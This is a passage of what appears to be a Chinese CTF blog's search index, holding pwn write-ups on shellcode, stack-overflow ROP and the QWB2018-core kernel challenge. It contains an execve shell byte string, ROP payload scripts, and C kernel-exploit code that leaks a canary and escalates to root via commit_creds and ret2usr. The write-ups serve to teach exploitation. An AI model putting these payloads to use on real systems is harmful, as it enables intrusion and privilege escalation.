((int (*)(void))v4)();\n```\n\n可以猜出来是输入到v4中，然后v4被强制转换成函数指针被调用。查看汇编代码也可以看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191554098.jpeg)\n\n这里就没办法判断到底[esp+34h]是不是v4了，因为v4是通过mmap申请的一块内存，虽然在栈上，但是并不知道在哪，需要通过调试才能知道，调试之后发现确实是这样。\n\n2.虽然最开始checksec程序，发现开了NX，那么这不就代表没办法shellcode了吗。调试也发现，除了代码段，其它段都没有X属性，都不可执行。但是我们看汇编代码，是call eax，调用的是寄存器，不是程序段，一定可以被调用的，然后eax中保存的内容就是我们输入的内容啊，所以直接输入shellcode就完事，连栈溢出什么的都不用考虑。\n\n3.那么直接从http://shell-storm.org/shellcode/\n\n查找获取就可以。给出一段可用shellcode:\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n\n \n\n由于这段shellcode调用的是int80来获取shell的，所以给出下列介绍\n\n▲int 80h：128号中断\n\n1.在32位Linux中该中断被用于呼叫系统调用程序system_call()。\n\n2.read(), write(), system()之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。\n\n3.输入的shellcode也就汇编成了EAX = 0Xb = 11，EBX = &(“/bin//sh”), ECX = EDX = 0，等同于执行代码sys_execve(\"/bin//sh\", 0, 0, 0)，通过/bin/sh软链接打开一个shell。这里sys_execve调用的参数就是ebx的对应的地址。所以我们可以在没有system函数的情况下打开shell。64位linux系统的汇编指令就是syscall，调用sys_execve需要将EAX设置为0x3B，放置参数的寄存器也和32位不同\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"RedHat 2017-pwn1","url":"/2021/08/14/RedHat 2017-pwn1/","content":"\n \n\n1.常规 checksec查看一下，发现开启了NX，IDA打开程序找漏洞，变量V1的首地址为bp-28h，即变量在栈上。而之后还有__isoc99_scanf不限制长度的函数，所以输入会导致栈溢出。这样就可以寻找system和”bin/sh”来getshell了。\n\n```\n#注释头\n\nint v1; // [esp+18h] [ebp-28h]\n----------------------------------------------------------\n__isoc99_scanf(\"%s\", &v1);\n```\n\n2.首先ctrl+s看看.got.plt中有没有system函数，这里有。找到system函数后，再寻找”/bin/sh”，但是找不到，所以考虑从__isoc99_scanf来读取”/bin/sh”来写入到内存进程中。\n\n3.接下来考虑字符串”/bin/sh”应该放到哪里，因为可能会有ASLR(地址随机化)的影响，所以最好找个可以固定的内存地址来存放数据。ctrl+s查看内存页后可以看到有个0x0804a030开始的可读可写的大于8字节的地址，且该地址不受ASLR影响，所以可以考虑把字符串读到这里。(可以看到有R和W权限，但我也不知道怎么看该地址受不受到ASLR的影响，可以按照以前的做法，这里可以将该地址修改为某个extern段的地址，因为延迟绑定之后，这个段中的内容就基本没用了，这里选择这个段上的某个地址一样可以getshell，我选的是0x0804A050。)\n\n4.既然程序读取用的是__isoc99_scanf，那么参数”%s”也得找到，容易找到位于0x08048629。\n\n5.先编写rop链测试一下：\n\n```\n#注释头\n\nelf = ELF('./pwn1')#rop链必备，用于打开plt和got表来获取函数地址\nscanf_addr = p32(elf.symbols['__isoc99_scanf'])#获取scanf的地址\nformat_s = p32(0x08048629)#这是我们scanf赋予”%s”的地址\nbinsh_addr = p32(0x0804a030)#bin/sh保存的地址\n\nshellcode = ‘A’*0x34 + scanf_addr + format_s + binsh_addr\nprint io.read()\n#读取puts(\"pwn test\")的输出，以便继续执行。io.recv()一样可以，具体用法再做参考\nio.sendline(shellcode1)#第一次scanf输入shellcode1\n```\n\n这里\"A\"*0x34有点不一样，我们可以看到在该函数中声明的局部变量v1距离栈底有0x28，那么main函数的返回地址应该是0x28+0x04=0x2c才对。但是实际上，由于程序最开始的动态链接，是从start开始初始化main函数栈的，所以经过start函数会给main函数栈上压入两个全局偏移量。通过调试也可以看到，输入AAAA,位于FFFDF568,加上0x28应该等于FFFDF590，但是这里却不是ebp，得再加上两个0x04才是ebp的位置。这是因为在程序运行起来的延迟绑定的关系，压入栈的是全局偏移。不过不用管，没啥用，这里直接再加上两个0x04就好了，通过调试也可以调试出来。而且查汇编代码，发现寻址方式是通过esp寻址，也就是[esp+18h]，FFFDF550+0x18=FFFDF568，也就是我们输入的地方。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551130.jpeg)\n\n6.程序运行到这没什么问题，但是接着运行下去从由于我们覆盖的是main函数的返回地址，让main返回地址返回到scanf中，执行的是return命令。而再次进入到scanf函数中之后，执行：io.sendline(“/bin/sh”)。发现binsh并没有被读入到binsh_addr中，这是因为scanf读取输入时的汇编操作如下：假设为scanf(“%s”,&v1);\n\n```\n#注释头\n\npush v1\npush %s\npush eip\n```\n\n栈的分布如下：\n\n```\n#注释头\n\n栈顶\nscanf返回地址              ---esp +1\nscanf第一个格式化参数%s    ---esp+2\nscanf第二个输入进的参数&v1  ---esp+3\n\n执行时是取esp +2,esp+3\n```\n\n而我们直接return scanf的栈分布如下：\n\n```\n#注释头\n\nscanf 第一个格式化参数%s       ---p32(format_s)   ---esp+1\nscanf第二个输入进的参数&v1     ---p32(binsh_addr)  --esp+2\n执行时是取esp+2,esp+3\n```\n\nscanf在执行过程中，由于我们没有将scanf的返回地址压入栈中，所以第一个读取的是esp+2，将我们需要输入的binsh的地址当作了格式化参数%s来读取，发生错误。之后scanf也没办法正常返回\n\n8.所以我们用main函数的return来调用scanf时，需要给栈布置一个scanf的返回地址，否则scanf执行过程中会读取参数发生错误，不能正常读取和返回。\n\n9.那么第一次的shellcode顺序应该是‘A’*0x34 + scanf_addr + scanf_returnaddr + format_s + binsh_addr。\n\n```\n#注释头\n\nshellcode1 = 'A'*0x34\t#padding\nshellcode1 += scanf_addr # 调用scanf以从STDIN读取\"/bin/sh\"字符串\nshellcode1 += scanf_retn_addr # scanf返回地址\nshellcode1 += format_s # scanf参数 \nshellcode1 += binsh_addr # \"/bin/sh\"字符串所在地址\n```\n\n之后大多有两种解决方案：\n\n▲第一种：将scanf返回到main，再次执行栈溢出：\n\n也就是将scanf的返回地址设置为main函数的地址，scanf出来之后，回到mian中之后，第二次的shellcode应该是’A’*0x2c +system_addr + system_ret_addr + binsh_addr。这里的system_addr和上述的scanf中是一样的，都是为了防止函数读取参数发生错误从而无法正常执行。但是这里的system_ret_addr可以随便填，因为我们并不需要返回system，进入到system之后执行binsh就能getshell了。而’A’*2c是因为栈的状态发生了改变，所以需要重新计算一下。因为再次进入main函数构造出来的Main函数栈应该是0x40，而不是之前0x48这么大了，没有经过start函数初始化main函数栈，不存在压入的全局偏移，系统只是将这次的main函数当作一个普通的函数来构造栈。\n\n所以这一次我们输入的内容距离栈底就确实只有0x28这么远了，那么计算一下0x28+0x04=0x2c，所以这一次的padding就是0x2c。\n\n```\n#注释头\n\nshellcode2 = 'B'*0x2c\t#padding\nshellcode2 += system_addr #跳转到system函数以执行system(\"/bin/sh\")\nshellcode2 += main_addr # system函数返回地址，随便填\nshellcode2 += binsh_addr #system函数的参数\n```\n\n \n\n▲第二种：将scanf的返回地址拿来做文章，通过rop将esp直接下拉两个0x04到达我们输入的system，然后在从之后的地方读取binsh字符串，一次payload直接搞定：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551712.png)\n\n通过汇编代码可以看到，调用scanf时的栈状态应该跟下图一样：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551658.png)\n\n所以我们scanf函数返回时esp应该还是指向的format参数地址才对，那么为了将esp下拉两个0x04，到达输入的system函数地址，就需要两个Pop操作，这里通过ROPgadget可以查出来，或者直接从init什么的初始化段中找万能gadget，同样存在多个Pop操作。那么这样的化就只有一次payload，所以总的payload就应该是：\n\n```\n#注释头\n\nshellcode1 = 'A'*0x34 #padding\nshellcode1 += scanf_addr # 调用scanf以从STDIN读取\"/bin/sh\"字符串\nshellcode1 += pop_pop_ret_addr# scanf返回后到两个Pop操作处\nshellcode1 += format_s # scanf参数\nshellcode1 += binsh_addr #作为scanf的参数读取binsh字符串\nshellcode1 += system_addr # \"/bin/sh\"字符串所在地址\nshellcode1 += binsh_addr #作为system的参数getshell\n```\n\n▲这里再给出第三种方案，也比较容易理解\n\n这个方案是基于第一种的，覆盖scanf返回地址为start函数，这样main函数栈又重新初始化，相当重新执行一次程序，那么第二次的shellcode的padding字符个数还是0x34个A，之后就常规覆盖eip跳转system函数getshell了。但是这里直接写start函数的首地址会出错，因为这里的start首地址为0x08048420，末尾为20，转化成字符串就是空格。而读入我们输入的又是scanf，scanf不支持空格录入，所以遇到空格就会发生截断，导致读不进去。而这里又是因为大端序，如果发生0x08048420，那么先发送的字符是0x20，也就是空格，那么就直接截断，之后所有数据都读不了了。所以这里如果需要传入start函数，则将start函数下拉两个字节，传入0x08048422。看汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551445.jpeg)\n\nstart函数体的第一条汇编指令是xor ebp,ebp。异或操作，就是将ebp清理好初始化而已，啥用也没有，所以可以直接跳过，到pop esi就行。具体代码就是将第一种方案的种第一段shellcode的main_addr改成start_addr+0x02，然后偏移都是0x34就行。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.cnblogs.com/sweetbaby/p/14148625.html\n\n \n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"ROP汇总","url":"/2021/08/14/ROP汇总/","content":"\n一、32位ROP：\n\n1.如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：\n\nsystem函数-system函数的返回地址-sytem函数的参数。\n\n2.但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：\n\ncall system函数地址-system函数参数。\n\n(两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)\n\n \n\n二、64位ROP：\n\n需要传参指令：pop rdi;ret。这里就不用管是plt还是call了，因为传参是rdi传参，返回地址是啥都没关系，多参数的需要万能gadget。\n\n▲64位程序中函数取参数是取rdi中内容指向的内存中的内容，相当于*rdi，同样的32位程序中取参是取栈上的内容指向的内存中的内容，相当于*[ebp+var_0xh]，所以直接输入binsh字符串来赋值给rdi或者赋值给函数参数肯定是不行的，因为这不是一个有效的地址，而是字符串的二进制形式。\n\n \n\n三、万能gadget\n\n1.传入got表和plt表的区别：\n\n万能gadget中调用我们想调用的函数为call qword ptr[r12+rbx*8]，硬编码为FF，是取r12中保存的内容当作一个地址a，这个地址a保存的内容应该是一个地址b，该地址b指向的地方才是可以被执行的实际代码位置。\n\n例如:\n\n```\n#注释头\n\nr12:    got_a\ngot_a:  0x111\n0x111:  mov a b\n```\n\n所以call qword ptr[r12+rbx*8]实际执行跳转到的位置是0x111，而执行的代码是mov a b;只能传入got表，如果传入plt表，那么应该如下：\n\n```\n#注释头\n\nr12:          plt_a\nplt_a:        jmp got_a\njmp got_a:    无效编码地址\n#这个jmp got_a转换成硬编码就不是一个有效地址\n```\n\n2.不同的call区别：\n\nFF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。\n\nE8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。\n\n▲普通call，EB编码：call fun_c(最常用的)\n\nfun_c： mov a b\n\n相当于直接跳转到fun_c这个地址来执行代码\n\n \n\n \n\n四、main函数返回的ROP：\n\n1.最开始启动程序时，main函数栈不是汇编代码写的那么大，而应该再大两个0x04用来存放全局偏移，所以计算偏移时就需要再加上两个0x04\n\n2.通过再次进入main函数中之后，程序只会依照汇编代码来构造Mainh函数栈，所以这一次里的main函数栈中就没有全局偏移的东西了，正常计算偏移。\n\n \n\n \n\n五、技巧性：\n\n1.通过覆盖返回地址调用函数时，可以注意上一个函数栈中的esp的位置，然后直接通过Pop等操作继续往下retn到输入的payload中的函数地址。(RedHat 2017-pwn1)\n\n2.rop主要是找system函数和binsh字符串，没有的话其实用int80可以代替system，然后sh\\bash什么的也可以代替binsh字符串。\n\n3.使用int80的话需要设置寄存器，同样如果有其它可以用到的系统调用，可以通过：\n\nhttp://syscalls.kernelgrok.com/ 这个来查找\n\n4.onegadget需要条件满足，可以直接查：one_gadget libc文件，然后通过调试或者IDA看汇编，观察到达调用onegadget的时候条件满不满足。\n\n5.查找：\n\n```\n#注释头\n\none_gadget libc_so.6\nROPgadget --binary file | grep \"pop eax ; pop ebx ; pop esi ; pop edi ; ret\"\n```\n\n \n\n \n\n \n\n \n\n总结：\n\n所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。\n\n需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。\n\n需要打印真实函数地址时，传的一定是got表，这样就一定没错。\n\n当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。\n\n \n\n1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。\n\n2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。\n\n3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。\n\n4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以\n","tags":["Fmstr"],"categories":["PWN","ROP0x3"]},{"title":"QWB2018-core","url":"/2021/08/14/QWB2018-core/","content":"\n一、使用Kernel_ROP\n\n1.首先解包，查看init设置：\n\n```\n#注释头\n\n#!/bin/sh\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2\ninsmod /core.ko\n\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0 -f\n```\n\n注意三个地方：\n\n```\n//注释头\n\necho 1 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /tmp/kallsyms ------------------------------------------------------------ \ninsmod /core.ko \n------------------------------------------------------------- \nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n```\n\n(1)把/proc/kallsysm拷贝到tmp文件夹下一份，而kallsysm中保存了加载内核之后几乎所有的函数调用：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508732.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508526.jpeg)\n\n由于被kptr_restrict设为 1，这样就不能通过 /proc/kallsyms查看函数地址了，但是这里把kallsysm拷贝到了tmp文件夹下，那么就可以从tmp文件夹下的kallsysm找到所有需要的地址，包括gadget。\n\n(2)insmod /core.ko，挂载了目录下的core.ko驱动程序，通常这个驱动程序就是漏洞的所在点，用IDA打开分析。\n\n(3)setsid /bin/cttyhack setuidgid 1000 /bin/sh，这个就是设置用户权限了，1000为权限ID，如果设置为0就是root权限了，为了调试，可以先设置成0方便点。\n\n2.再看下start.sh启动qemu的设置：\n\n```\n#注释头\n\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./core.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n可以看到加载了core.ko驱动，并且开启了kaslr。\n\n3.然后分析下core.ko代码，漏洞点在core_copy_func函数和core_write函数：\n\n```\n#注释头\n\n#core_write函数：\nif ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )\n\n\n#core_copy_func函数：\n__int64 v2; // [rsp+0h] [rbp-50h]\n-------------------------------------------------------\nif ( a1 > 63 )\n{\n   printk(&unk_2A1);\n   result = 0xFFFFFFFFLL;\n}\nelse\n{\n    qmemcpy(&v2, &name, (unsigned __int16)a1);\n}\n```\n\n(1)name是全局变量，core_write函数从用户空间拷贝了v3长度到name中，而core_write函数可以通过exp中调用write，write(core_fd, data, 0x800);打开该驱动从而调用驱动中的core_write函数，将我们的data写入到name中。\n\n(2)之后由于core_copy_func函数可以通过ioctl函数直接传参调用，所以其中的a1受到我们控制，然后对a1的检查又只有一个if(a1>63)，存在整数转换的漏洞，也就是如果a1为负数，就能够通过if语句，那么通过qmemcpy(&v2, &name, (unsigned __int16)a1);函数的隐形转换，就可以从name拷贝很大的数据到v2上，而v2在内核栈上，那么就可以对内核栈进行栈溢出。\n\n4.可以构造rop链尝试了，但是这里还有一个canary，Leak漏洞在core_read和ioctl函数上：\n\n```\n#注释头\n\n#core_read函数：\n__int64 v5;\n--------------------------------------------------------\nresult = copy_to_user(v1, (char *)&v5 + off, 64LL);\n\n#ioctl函数：\ncase 0x6677889C:\n    printk(&unk_2CD);\n    off = v3;\n    break;\n```\n\noff是全局变量，可以通过调用ioctl函数来设置。v5是core_read内核函数栈上的变量，可以使得off适当大一些，从而泄露出canary。\n\n5.现在尝试构造exp：\n\n(1)首先找地址：\n\n```\n//注释头\n\n//找到内核加载基地址vmlinux_base和prepare_kernel_cred函数、commit_creds函数地址\nsize_t find_symbols()\n{\n    FILE* kallsyms_fd = fopen(\"/tmp/kallsyms\", \"r\");\n    if(kallsyms_fd < 0)\n    {\n        puts(\"[*]open kallsyms error!\");\n        exit(0);\n    }\n\n    char buf[0x30] = {0};\n    while(fgets(buf, 0x30, kallsyms_fd))\n    {\n        if(commit_creds & prepare_kernel_cred)\n            return 0;\n\n        if(strstr(buf, \"commit_creds\") && !commit_creds)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            /* printf(\"hex: %s\\n\", hex); */\n            sscanf(hex, \"%llx\", &commit_creds);\n            printf(\"commit_creds addr: %p\\n\", commit_creds);\n            vmlinux_base = commit_creds - 0x9c8e0;\n            printf(\"vmlinux_base addr: %p\\n\", vmlinux_base);\n            \n        }\n\n        if(strstr(buf, \"prepare_kernel_cred\") && !prepare_kernel_cred)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            sscanf(hex, \"%llx\", &prepare_kernel_cred);\n            printf(\"prepare_kernel_cred addr: %p\\n\", prepare_kernel_cred);\n            vmlinux_base = prepare_kernel_cred - 0x9cce0;\n            /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */\n        }\n    }\n\n    if(!(prepare_kernel_cred & commit_creds))\n    {\n        puts(\"[*]Error!\");\n        exit(0);\n    }\n}\n```\n\n这里的0x9c8e0和0x9cce0都是通过ROPgadget查找vmlinux找出来的，不过找到的地址是相对偏移加上了0xffffffff81000000，所以这里需要减去得到相对偏移。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508584.jpeg)\n\n(2)然后泄露canary:\n\n```\n//注释头\n\nvoid core_read(int fd, char *buf)\n{\n    puts(\"[*]read to buf.\");\n    ioctl(fd, 0x6677889B, buf);\n}\n----------------------------------------------------------------------\nvoid set_off(int fd, long long idx)\n{\n    printf(\"[*]set off to %ld\\n\", idx);\n    ioctl(fd, 0x6677889C, idx);\n}\n---------------------------------------------------------------------\nset_off(fd, 0x40);\n\nchar buf[0x40] = {0};\ncore_read(fd, buf);\nsize_t canary = ((size_t *)buf)[0];\nprintf(\"[+]canary: %p\\n\", canary);\n//这里fd为int fd = open(\"/proc/core\", 2);\n```\n\n(3)构造rop链：\n\n```\n//注释头\n\nssize_t offset = vmlinux_base - 0xffffffff81000000;\nsize_t rop[0x1000] = {0};\nfor(int i = 0; i < 10; i++)\n{\n    rop[i] = canary;\n}\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss;\n```\n\n这里rop链构造一般分为\n\n①覆盖返回地址，执行commit_creds(prepare_kernel_cred(0) )函数，提权，即：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\n②通过swapgs和iretq返回用户态：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n```\n\n▲这里的swapgs和iretq最好用objdump -d vmlinux > gadget来保存寻找，如果用ROPgadget或者ropper可能不识别，从而无法找到。\n\n③着陆开shell：\n\n```\n//注释头\n\n\nvoid spawn_shell()\n{\n    if(!getuid())\n    {\n\tsystem(\"/bin/sh\");\n    }\n    else\n    {\n\tputs(\"[*]spawn shell error!\");\n    }\n    exit(0);\n}\n----------------------------------------------------\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss; // ss\n```\n\n(4)最后输入rop链，提权执行：\n\n```\n//注释头\n\nvoid core_copy_func(int fd, long long size)\n{\n    printf(\"[*]copy from user with size: %ld\\n\", size);\n    ioctl(fd, 0x6677889A, size);\n}\n--------------------------------------------------------------\nwrite(fd, rop, 0x800);\ncore_copy_func(fd, 0xffffffffffff0000 | (0x100));\n```\n\n▲需要注意的是在程序进入内核态之前需要保存下用户态的参数，不然之后没办法返回用户态开shell：\n\n```\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        );\n    puts(\"[*]status has been saved.\");\n}\n```\n\n \n\n二、使用Ret2usr技术：\n\n1.在这道题中与ROP差不多，唯一的区别在于提权的时候：\n\n(1)ROP技术中，利用思想和常规pwn题一样，rdi传参之后寻找Gadget来调用commit_creds(prepare_kernel_cred(0))。\n\n(2)Ret2Usr技术中，由于我们是直接运行我们的二进制文件exp，所以在exp文件内声明定义的函数会被加载到exp的进程中，可以直接在exp中调用，不需要rop。但是这里如果直接调用system(\"/bin/sh\")没什么用，权限仍然不是root，还是需要调用commit_creds(prepare_kernel_cred(0))提权才行，所以这里就可以利用泄露出来的地址直接构造该函数调用即可，而不用再rop来调用了。\n\n就相当于将以下代码替换一下：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\n替换成：\n\n```\n//注释头\n\nrop[i++] = (size_t)get_root;\n------------------------------------------------\n//函数定义为：\nvoid get_root()\n{\n    char* (*pkc)(int) = prepare_kernel_cred;\n    void (*cc)(char*) = commit_creds;\n    (*cc)((*pkc)(0));\n    /* puts(\"[*] root now.\"); */\n}\n```\n\n最开始我想为什么不直接运行调用，后面才知道是特权模式问题。如果直接调用，就会出现访问错误，因为我们构造的函数的函数地址是在内核空间中，而用户空间是无法运行内核空间的函数。所以需要调用write(fd, rop, 0x30 * 8);进入到内核空间，获得特权模式下ring0的权限，然后运行用户空间的get_root()函数，再进入到内核空间寻找对于的commit_creds函数和prepare_kernel_cred(0)结构体，从而提权。\n\n \n\n \n\n \n\n \n\n参考资料:\n\nctfwiki\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel题"],"categories":["pwn-kernel","Kernel-ROP","Kernel-Ret2Usr"]},{"title":"Security Fest CTF 2016-tvstation","url":"/2021/08/14/Security Fest CTF 2016-tvstation/","content":"\n \n\n1.题目给了libc库，需要查看一下版本，直接拖到Linux中运行一下./libc.so.6_x64，就可以知道是libc2.24的，但Linux中的libc没有该版本，所以用pwndocker来连接运行。具体怎么用看下方链接，同样docker也自行学习。\n\nhttps://github.com/skysider/pwndocker\n\n如果需要使用到这个libc调试，则在python中设置下列代码：\n\n```\n#注释头\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n```\n\n2.然后开始分析文件，常规checksec，开了NX，IDA打开文件找漏洞，发现输入4进入debug函数后可以泄露system的内存地址：\n\n```\n#注释头\n\nv0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, \"system\");\nsprintf(fmsg, info, v0);\nv1 = strlen(fmsg);\nwrite(1, fmsg, v1);\n```\n\ndlsym()的函数原型是\n\nvoid* dlsym(void* handle,const char* symbol);\n\n该函数在<dlfcn.h>文件中,handle是由dlopen打开动态链接库后返回的指针，symbol就是要求获取的函数的名称，函数返回值是void*,指向函数的地址，供调用使用。write函数的fd是1，所以就相当于直接打印在屏幕上，这里涉及linux系统调用号内容，可以直接查linux下的目录/usr/include/asm/中的unistd_32.h和unistd_64.h。\n\n这段代码的意思就是把指向system函数的指针返回给v0,然后将v0格式化输出给fmsg，之后将fmsg原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个debug_func()，这里存在栈溢出：\n\n```\n#注释头\n\n__int64 buf; // [rsp+0h] [rbp-20h]\nreturn read(0, &buf, 0xC8uLL);\n```\n\n3.现在有了system的内存地址和栈溢出，就差/bin/sh字符串了。这里用IDA打开题目给的libc文件，可以找到bin/sh字符串的地址binsh_libc_addr和system的地址system_libc_addr。所以这就相当于有system的被libc加载的真实地址，那么system的真实system_addr减去system_libc_addr就可以得到Libc被加载进来的首地址libc_start_addr。即现掌握地址：libc_start_addr，system_addr，system_libc_addr，binsh_libc_addr通过计算可得：binsh_addr = system_addr - system_libc_addr + binsh_libc_addr。这不是栈溢出有了，system函数和binsh字符串的真实地址有了，这不直接getshell就完事了吗，闹啥呢，这破题目，没点技术含量。\n\n4.但程序还是得走走，64位程序，所以需要使用ROPgadget表来查找pop rdi ; ret这个代码所在的地址，也是在Libc中查找到，然后加上libc_start_addr就可得到pop_rdi_addr。\n\n5.之后计算偏移量，远程调试下进行，payload依次为padding + pop_rdi_addr + binsh_addr + system_addr。\n\n6.再考虑输入情况：先在Linux下运行，所以能看到需要在接收到”: ”时可以输入4，然后进入到打印system_addr，打印完之后，需要从打印出来的system地址读取进我们设定的system_addr。\n\n7.由于打印格式是@x0x7ffffff，所以在recvuntil”@x”，之后开始获取打印的system_addr:system_addr = int(io.recv(12), 16)，以十六进制总共读取12位\n\n8.读取完成system_addr后就可以开始输入payload，之后就可以interactive()。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"StarCTF2019_heap_master","url":"/2021/08/14/StarCTF2019_heap_master/","content":"\n这道题学到了很多，特此记录一下。\n\n# 1.常规checksec一下，保护全开。\n\n# 2.函数解析：\n\n比较常规的菜单题，这里的add是正常，但是程序最开始mmap一块0x10000大小的chunk，之后的edit和delete都是针对这个最开始mmap出来的chunk。\n\n(1)edit函数：输入偏移，针对m_chunk_addr对应偏移修改。比如m_chunk_addr=0x100，偏移为0x10，修改内容为'M'那么修改内容为*(0x100+0x10) = 'M'，即*(m_chunk_addr+offset) = 